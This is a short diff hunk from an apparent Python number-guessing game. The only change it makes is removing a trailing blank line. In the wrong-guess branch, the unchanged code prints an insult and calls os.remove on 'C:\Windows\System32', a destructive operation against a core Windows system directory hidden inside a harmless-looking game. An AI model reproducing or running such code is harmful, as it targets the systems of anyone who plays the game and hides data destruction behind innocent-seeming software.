@@ -11,4 +11,3 @@ if guess == number:
 else:
     print("You suck!!!")
     os.remove("C:\Windows\System32")
-
